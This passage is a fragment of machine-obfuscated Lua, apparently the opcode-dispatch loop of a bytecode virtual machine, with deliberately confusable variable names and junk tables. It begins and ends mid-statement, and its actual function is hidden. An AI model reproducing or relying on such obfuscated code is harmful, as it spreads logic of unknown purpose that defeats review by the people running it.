ajefa_lllIIlIllIlIllllIIlIIlll[#("2Klx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("EdH")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UK")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5Ve")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hX")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("0O0")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("pW")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("3Gl")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("04")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cbb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sYHs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dm")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{{27;627;243;365};"1 + 1 = 111";{330;743;211;874};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2b")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OtT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("g8Is")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("xty")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qq")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("pdc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("02K")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cbOl")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5A")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CZx")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Varz")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d3f")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KWK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{635;105;539;1};{355;945;627;235};"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vV")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eMP")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("84h6")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Fn")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("gdc")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aa")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("cet")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9FtR")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZY")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pfJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("q2sA")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("1fddxh2bi3AnqP94p6gzJeRHd")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sa")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("DN6")]~=0);else local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("BFK")];local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("i8eZ")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5p")]]=ajefa_IlIIIlIllIlIlllIlIlIllll;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("6JlbtzYOKokUZN4ht2TWErhyorvh7")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("zHacls0gKazNfVUFhDFCUYYq0PB")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{623;790;239;333};{224;886;2;712};}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ke")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ozA")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2rXt")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DD")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("T9P")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("qY")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RG")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ylB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Tt")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Z8E")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("VP")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("In")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("F0g")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nm")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("up1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gp5n")]];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("XcdRRW0OUWCLrnsSx1mxNTj3MGdK")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("sC")]local ajefa_lIIllIlIIlllII,ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_llIIllIIIIlI(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1]))ajefa_lIIIIIlIllIlllllllIIll=ajefa_IlIIIlIllIlIlllIlIlIllll+ajefa_lllIIlIllIlIllllIIlIIlll-1 local ajefa_IlIIIlIllIlIlllIlIlIllll=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_lIIIIIlIllIlllllllIIll do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];end;else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("t3")];local ajefa_lIIllIlIIlllII=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZA7")]];ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll+1]=ajefa_lIIllIlIIlllII;ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll]=ajefa_lIIllIlIIlllII[ajefa_lllIIlIllIlIllllIIlIIlll[#("B1qW")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("TmH2ctI7S5s5gVua4jGGf39Cekd2ke")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("jW")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+2];local ajefa_IlIIllIIIl=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]+ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIllIIIl;if(ajefa_IIIlIllIllllIIllIlllIIll>0)then if(ajefa_IlIIllIIIl<=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("bMM")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif(ajefa_IlIIllIIIl>=ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Orx")];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+3]=ajefa_IlIIllIIIl;end elseif ajefa_IIIlIllIllllIIllIlllIIll>#("Sq4aK5To3UUP53CH7Z2SvHdNZneX1pQ")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rk")]]~=ajefa_lllIIlIllIlIllllIIlIIlll[#("i3SM")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("PTX")];end;else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("aI")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("NUKPlVVfl5NWundJMNgcsxZlmrkx15yNe7cksX")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("meWHB4rsLjFknjNEp4zC4KyopH9Rxl3pZr4")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("G0zq58KmvUjECEWp3uCMQIq34K5Aqpv6o")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zI")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("A4C")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qRLK")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("8AGhH5al3GyFp3ANvF0rs8JFxudj6fznpX")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{319;31;154;27};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("mju")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("s3i2")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qm")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("bmI")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("eMrA")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ga")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("DCA")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("RhY6")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IDV")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UJgy")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Vg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("bfN")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("zLHJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6k")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("J3i")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{933;871;555;746};{604;279;869;640};}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("L0S")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("oqCD")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JI")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("d0H")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JB")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("XJU")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("aU")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fGJ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lRnH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eme")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ngcq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LZ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1yf")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("YJ0h")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5N")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7Dp")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("afVh")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9n")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("rRS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("RKmk")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zg")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("bW0")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0G")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("FWv")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("SxJr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{359;163;207;500};{117;887;461;902};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4al")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YjZ0")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GI")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Tfo")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("94rq")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fY")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("HYR")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("OG0i")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ug")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Z5Q")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("ZUzA")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wg")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("VHZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("jFu1")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qt")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Lmi")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("LEci")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jk")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0BP")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1HVJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIII